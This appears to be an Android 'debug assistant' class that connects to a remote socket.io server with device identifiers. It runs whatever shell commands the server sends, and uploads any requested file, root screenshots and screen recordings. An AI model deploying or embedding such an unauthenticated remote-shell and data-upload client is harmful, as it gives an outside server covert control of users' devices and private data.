package com.mm.debugassistant.dcon;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.text.TextUtils;

import com.mm.debugassistant.utils.Constant;
import com.mm.debugassistant.utils.NetworkUtils;
import com.mm.debugassistant.utils.ProcessUtils;
import com.mm.debugassistant.utils.RxUtils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import okhttp3.HttpUrl;
import timber.log.Timber;

public class ConnectionManager {
    private static ConnectionManager INSTANCE = new ConnectionManager();
    public Context context;
    private io.socket.client.Socket ioSocket;
    private HandlerThread mHandlerThread;
    private Handler mHandler;
    private DataOutputStream mCmdStream;

    public static ConnectionManager getInstance() {
        return INSTANCE;
    }

    private ConnectionManager() {
        try {
            mHandlerThread = new HandlerThread("cm-thread");
            mHandlerThread.start();
            mHandler = new Handler(mHandlerThread.getLooper());
            ProcessBuilder processBuilder = new ProcessBuilder("sh");
            processBuilder.redirectErrorStream(true);
            Process process = null;
            process = processBuilder.start();
            mCmdStream = new DataOutputStream(process.getOutputStream());
            final InputStream stdout = process.getInputStream();
            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        StringBuilder sb = new StringBuilder();
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = stdout.read(buffer)) != -1) {
                            String result = new String(buffer, 0, len, "utf-8");
                            try {
                                if (ioSocket != null)
                                    ioSocket.emit("cmdr", result);
                            } catch (Exception e) {
                                Timber.e(e, "emit cmdr error");
                            }
                        }
                    } catch (Exception e) {
                        Timber.e(e, "read daemon process out error");
                    }
                }
            });
            thread.setDaemon(true);
            thread.start();
        } catch (IOException e) {
            Timber.e(e, "init cm error");
        }
    }

    public void connect() {
        if (RxUtils.isMainThread()) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    connect(10);
                }
            }).start();
        } else {
            connect(10);
        }
    }

    public void connect(int remainTries) {
        if (remainTries <= 0) {
            Timber.e("Can't connect, retry limitation");
            return;
        }
        try {
            send();
        } catch (Exception e) {
            connect(--remainTries);
        }
    }

    private void send() throws URISyntaxException {
        if (ioSocket != null) return;
        IO.Options options = new IO.Options();
        options.reconnection = true;
        // options.reconnectionAttempts = 10;
        options.reconnectionDelay = 5000;
        options.reconnectionDelayMax = 5 * 60 * 1000; // 5 min
        String androidID = NetworkUtils.getAndroidID();
        String did = NetworkUtils.getDid();
        if (TextUtils.isEmpty(did)) {
            did = "123456879";
        }
        HttpUrl url = new HttpUrl.Builder()
                .scheme("http")
                //.host("192.168.199.169")
                .host(Constant.DEF_CONN_SERVER)
                .port(8080)
                .addQueryParameter("brand", Build.BRAND)
                .addQueryParameter("model", Build.MODEL)
                .addQueryParameter("manf", Build.MANUFACTURER)
                .addQueryParameter("release", Build.VERSION.RELEASE)
                .addQueryParameter("android_id", androidID)
                .addQueryParameter("did", did)
                .build();
        ioSocket = IO.socket(url.toString(), options);
        ioSocket.on("ping", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                ioSocket.emit("pong");
            }
        });

        ioSocket.on("cmd", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    final String cmd = args[0].toString();
                    mHandler.post(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                mCmdStream.writeBytes(cmd);
                                mCmdStream.writeBytes("\n");
                                mCmdStream.flush();
                            } catch (IOException e) {
                                Timber.e(e, "run cmd error %s", cmd);
                            }
                        }
                    });
                } catch (Exception ignored) {
                }
            }
        });

        ioSocket.on("dld", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    String path = args[0].toString();
                    downloadFile(path);
                } catch (Exception e) {
                    Timber.e(e, "dld file error");
                }
            }
        });

        ioSocket.on("scc", new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                try {
                    scc();
                } catch (Exception e) {
                    Timber.e(e, "scc error");
                }
            }
        });
        // screen recoder
        ioSocket.on("src", new Emitter.Listener() {
            @Override
            public void call(final Object... args) {
                if (RxUtils.isMainThread()) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                String rcTime = "";
                                if (args.length > 0) {
                                    rcTime = args[0].toString();
                                }
                                src(rcTime);
                            } catch (Exception e) {
                                Timber.e(e, "src error");
                            }
                        }
                    }).start();
                } else {
                    try {
                        String rcTime = "";
                        if (args.length > 0) {
                            rcTime = args[0].toString();
                        }
                        src(rcTime);
                    } catch (Exception e) {
                        Timber.e(e, "src error");
                    }
                }
            }
        });

        ioSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io connected!");
            }
        });
        ioSocket.on(Socket.EVENT_CONNECTING, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io connecting!");
            }
        });

        ioSocket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io connect error!");
            }
        });

        ioSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io disconnected!");
                connect(); // reconnect
            }
        });
        ioSocket.on(Socket.EVENT_CONNECT_TIMEOUT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io connect timeout!");
            }
        });
        ioSocket.on(Socket.EVENT_RECONNECT_ATTEMPT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io reconnect attempt!");
            }
        });
        ioSocket.on(Socket.EVENT_RECONNECT, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io reconnect!");
            }
        });
        ioSocket.on(Socket.EVENT_RECONNECT_ERROR, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io reconnect error!");
            }
        });

        ioSocket.on(Socket.EVENT_RECONNECT_FAILED, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io reconnect failed!");
            }
        });

        ioSocket.on(Socket.EVENT_ERROR, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io error!");
            }
        });
        ioSocket.on(Socket.EVENT_MESSAGE, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io message!");
            }
        });

        ioSocket.on(Socket.EVENT_PING, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io ping!");
            }
        });

        ioSocket.on(Socket.EVENT_PONG, new Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Timber.i("socket.io pong!");
            }
        });
        ioSocket.connect();
    }

    private void downloadFile(String path) throws JSONException {
        if (TextUtils.isEmpty(path)) return;
        File file = new File(path);
        byte[] fileData = loadFile(path);
        if (fileData == null) return;
        JSONObject object = new JSONObject();
        object.put("name", file.getName());
        object.put("data", fileData);
        ioSocket.emit("dldr", object);
    }

    private void scc() throws JSONException {
        String[] cmds = {"rm /data/local/tmp/scctmp.png", "screencap -p /data/local/tmp/scctmp.png", "chmod 644 /data/local/tmp/scctmp.png"};
        ProcessUtils.runCmd(true, 30, cmds);
        byte[] fileData = loadFile("/data/local/tmp/scctmp.png");
        if (fileData == null) return;
        JSONObject object = new JSONObject();
        object.put("name", "scctmp.png");
        object.put("data", fileData);
        ioSocket.emit("sccr", object);
    }

    private void src(String rcTime) throws JSONException {
        int time;
        if (TextUtils.isEmpty(rcTime)) {
            time = 30;
        } else {
            try {
                time = Integer.parseInt(rcTime);
            } catch (Exception e) {
                time = 30;
            }
        }
        String[] cmds = {"rm /data/local/tmp/srctmp.mp4g",
                String.format("screenrecord --time-limit %d /data/local/tmp/srctmp.mp4", time),
                "chmod 644 /data/local/tmp/srctmp.mp4"};
        ProcessUtils.runCmd(true, time, cmds);
        byte[] fileData = loadFile("/data/local/tmp/srctmp.mp4");
        if (fileData == null) return;
        JSONObject object = new JSONObject();
        object.put("name", "srctmp.mp4");
        object.put("data", fileData);
        ioSocket.emit("srcr", object);
    }

    private byte[] loadFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) return null;
            int size = (int) file.length();
            byte[] data = new byte[size];
            BufferedInputStream buf = null;
            buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            buf.close();
            return data;
        } catch (Exception e) {
            Timber.e(e, "load file error");
            return null;
        }
    }
}
